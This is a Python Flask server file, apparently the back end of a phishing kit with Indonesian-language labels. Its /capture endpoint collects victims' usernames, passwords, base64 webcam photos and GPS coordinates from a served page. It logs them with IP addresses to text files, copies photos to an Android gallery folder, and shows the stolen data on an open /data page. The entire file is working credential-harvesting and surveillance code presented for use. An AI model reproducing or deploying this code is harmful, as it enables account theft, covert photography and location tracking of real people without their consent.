import os
import json
import base64
import shutil
import requests
from datetime import datetime
from flask import Flask, request, render_template, jsonify, send_from_directory

app = Flask(__name__)

CAPTURED_DIR = "captured"
IMAGES_DIR = os.path.join(CAPTURED_DIR, "images")
DATA_FILE = os.path.join(CAPTURED_DIR, "data.txt")
GPS_FILE = os.path.join(CAPTURED_DIR, "gps.txt")

os.makedirs(IMAGES_DIR, exist_ok=True)

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        username = data.get('username', '-')
        password = data.get('password', '-')
        image_data = data.get('image', '')
        ip = request.remote_addr
        public_ip = get_public_ip()
        lat = data.get('lat', '-')
        lon = data.get('lon', '-')
        acc = data.get('acc', '-')

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        image_path = ''
        if image_data:
            if ',' in image_data:
                image_data = image_data.split(',')[1]
            image_bytes = base64.b64decode(image_data)
            filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            filepath = os.path.join(IMAGES_DIR, filename)
            with open(filepath, 'wb') as f:
                f.write(image_bytes)
            image_path = f"/images/{filename}"

            # Auto copy to gallery (HP)
            try:
                shutil.copy(filepath, f"/sdcard/DCIM/Camera/{filename}")
            except:
                pass

        with open(DATA_FILE, 'a') as f:
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            f.write(f"📅 WAKTU  : {timestamp}\n")
            f.write(f"🌐 IP     : {ip}\n")
            if public_ip:
                f.write(f"🌐 IP PUBLIK : {public_ip}\n")
            f.write(f"👤 USER   : {username}\n")
            f.write(f"🔑 PASS   : {password}\n")
            f.write(f"📸 FOTO   : {image_path}\n")
            f.write(f"📍 GPS    : {lat}, {lon} (akurasi {acc}m)\n")
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

        with open(GPS_FILE, 'a') as f:
            f.write(f"[{timestamp}] {lat}, {lon} | {acc}m | IP: {ip}\n")

        return jsonify({"status": "success"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/images/<filename>')
def serve_image(filename):
    return send_from_directory(IMAGES_DIR, filename)

@app.route('/data')
def view_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return f.read().replace('\n', '<br>')
    except:
        return "Belum ada data"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
